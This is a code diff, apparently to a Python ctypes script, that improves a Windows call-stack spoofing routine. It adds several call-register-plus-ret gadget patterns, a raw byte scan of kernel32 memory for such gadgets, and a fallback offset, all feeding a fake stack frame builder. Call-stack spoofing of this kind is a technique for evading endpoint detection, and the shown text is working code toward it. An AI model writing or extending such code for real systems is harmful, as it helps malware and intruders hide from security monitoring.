@@ -41,10 +41,24 @@ PAGE_EXECUTE_READ      = 0x20
 PAGE_EXECUTE_READWRITE = 0x40
 
 # Gadget patterns we look for in kernel32
-# FF D0 = call rax  (appears in legitimate dispatch code)
-# C3    = ret
-CALL_RAX_RET_PATTERN = bytes([0xFF, 0xD0, 0xC3])
-RET_PATTERN          = bytes([0xC3])
+# We search multiple patterns in priority order
+# FF D0 C3 = call rax + ret
+# FF D1 C3 = call rcx + ret
+# FF D2 C3 = call rdx + ret
+# FF 15 xx xx xx xx = call [rip+offset] (very common in kernel32)
+# C3 = simple ret (fallback)
+CALL_RAX_RET_PATTERN  = bytes([0xFF, 0xD0, 0xC3])
+CALL_RCX_RET_PATTERN  = bytes([0xFF, 0xD1, 0xC3])
+CALL_RDX_RET_PATTERN  = bytes([0xFF, 0xD2, 0xC3])
+CALL_IND_PATTERN      = bytes([0xFF, 0x15])
+RET_PATTERN           = bytes([0xC3])
+
+# All patterns in priority order
+GADGET_PATTERNS = [
+    CALL_RAX_RET_PATTERN,
+    CALL_RCX_RET_PATTERN,
+    CALL_RDX_RET_PATTERN,
+]
 
 
 def check_platform():
@@ -208,15 +222,38 @@ def build_fake_stack_frame(explain=False):
         print(f"  [STACK SPOOFER] ntdll.dll      size: {ntdll_size:,} bytes")
         print("  [STACK SPOOFER] Scanning kernel32 for FF D0 C3 gadget...")
 
-    # Find gadget in kernel32 (call rax + ret pattern)
-    k32_gadget = find_gadget_in_module(
-        k32_base, k32_size, CALL_RAX_RET_PATTERN
-    )
+    # Search for gadget in kernel32 using multiple patterns
+    k32_gadget = None
+    for pattern in GADGET_PATTERNS:
+        k32_gadget = find_gadget_in_module(k32_base, k32_size, pattern)
+        if k32_gadget:
+            if explain:
+                print(f"  [STACK SPOOFER] Gadget found: {pattern.hex()} at {hex(k32_gadget)}")
+            break
 
-    # If no call rax + ret found, find simple ret in kernel32
+    # Fallback - scan for any ret preceded by a call instruction
     if not k32_gadget:
         if explain:
-            print("  [STACK SPOOFER] FF D0 C3 not found - using RET gadget")
+            print("  [STACK SPOOFER] Named patterns not found - deep scanning...")
+        # Look for: any 2-byte instruction ending with C3
+        for i in range(0x1000, min(k32_size, 0x80000)):
+            try:
+                b0 = ctypes.c_ubyte.from_address(k32_base + i).value
+                b1 = ctypes.c_ubyte.from_address(k32_base + i + 1).value
+                b2 = ctypes.c_ubyte.from_address(k32_base + i + 2).value
+                # FF Dx C3 family (call reg + ret)
+                if b0 == 0xFF and (0xD0 <= b1 <= 0xD7) and b2 == 0xC3:
+                    k32_gadget = k32_base + i + 2
+                    if explain:
+                        print(f"  [STACK SPOOFER] Deep scan found FF {b1:02X} C3 at {hex(k32_base + i)}")
+                    break
+            except Exception:
+                continue
+
+    # Final fallback - use known safe offset
+    if not k32_gadget:
+        if explain:
+            print("  [STACK SPOOFER] Using offset fallback at kernel32+0x2000")
         k32_gadget = find_ret_gadget(k32_base, k32_size, 0x2000)
 
     # Find addresses in kernelbase and ntdll
